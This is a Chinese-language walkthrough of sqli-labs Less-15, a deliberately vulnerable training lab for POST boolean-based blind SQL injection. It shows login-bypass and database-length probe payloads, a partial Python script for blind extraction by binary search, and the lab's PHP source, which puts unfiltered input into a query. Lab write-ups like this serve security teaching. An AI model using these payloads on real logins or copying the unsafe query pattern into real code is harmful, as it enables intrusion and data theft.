# Less-15 **POST Blind- Boolian Based- String**
TAG： POST型注入、布尔型盲注、字符型注入
## 漏洞利用  
在本less中，万能密码仍然存在  
payload:```1' or 1=1#```
![less15_1](images\less15_1.png)  
经过多次测试，本less并不会显示报错信息，考虑进行布尔型盲注  
测试数据库名长度的payload:
```1' or length(database())=8#```
此恶意语句将在数据库名长度为8时返回一个为真的布尔结果，使页面返回登陆成功信息，借此可以进行数据库名长度的判断  
手工盲注将耗费大量的时间，通常都通过编写python脚本来满足这一需求  

```
import requests
flag = ''
for i in range(1,250):
   low = 32
   high = 128
   mid = (low+high)//2
   while(low<high):
       payload = ""
       res = requests.get(url=payload)
       if 'flag.jpg' in res.text:
           low = mid+1
       else:
           high = mid
       mid = (low+high)//2
   if(mid ==32 or mid ==127):
       break
   flag = flag+chr(mid)
   print(flag)
```

## 源码分析  
### less15源码： 
```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<title>Less-15- Blind- Boolian Based- String</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:20px;color:#FFF; font-size:24px; text-align:center"> Welcome&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br></div>

<div  align="center" style="margin:40px 0px 0px 520px;border:20px; background-color:#0CF; text-align:center; width:400px; height:150px;">

<div style="padding-top:10px; font-size:15px;">
 

<!--Form to post the data for sql injections Error based SQL Injection-->
<form action="" name="form1" method="post">
	<div style="margin-top:15px; height:30px;">Username : &nbsp;&nbsp;&nbsp;
	    <input type="text"  name="uname" value=""/>
	</div>  
	<div> Password  : &nbsp;&nbsp;&nbsp;
		<input type="text" name="passwd" value=""/>
	</div></br>
	<div style=" margin-top:9px;margin-left:90px;">
		<input type="submit" name="submit" value="Submit" />
	</div>
</form>

</div></div>

<div style=" margin-top:10px;color:#FFF; font-size:23px; text-align:center">
<font size="6" color="#FFFF00">

<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);

// take the variables
if(isset($_POST['uname']) && isset($_POST['passwd']))
{
	$uname=$_POST['uname'];
	$passwd=$_POST['passwd'];

	//logging the connection parameters to a file for analysis.
	$fp=fopen('result.txt','a');
	fwrite($fp,'User Name:'.$uname);
	fwrite($fp,'Password:'.$passwd."\n");
	fclose($fp);


	// connectivity 
	@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
	$result=mysql_query($sql);
	$row = mysql_fetch_array($result);

	if($row)
	{
  		//echo '<font color= "#0000ff">';	
  		
  		echo "<br>";
		echo '<font color= "#FFFF00" font size = 4>';
		//echo " You Have successfully logged in\n\n " ;
		echo '<font size="3" color="#0000ff">';	
		echo "<br>";
		//echo 'Your Login name:'. $row['username'];
		echo "<br>";
		//echo 'Your Password:' .$row['password'];
		echo "<br>";
		echo "</font>";
		echo "<br>";
		echo "<br>";
		echo '<img src="../images/flag.jpg"  />';	
		
  		echo "</font>";
  	}
	else  
	{
		echo '<font color= "#0000ff" font size="3">';
		//echo "Try again looser";
		//print_r(mysql_error());
		echo "</br>";
		echo "</br>";
		echo "</br>";
		echo '<img src="../images/slap.jpg"   />';	
		echo "</font>";  
	}
}

?>


</font>
</div>
</body>
</html>
```

### 漏洞点分析：

通过阅读此页面的代码，可以发现less15只会显示登陆操作的成功与否，并不会显示数据库查询的结果信息，也就是没有回显点  
因此要进行布尔型盲注，通过页面的显示判断语句的成功与失败  
此漏洞也是来源于没有对用户的输入进行严格过滤  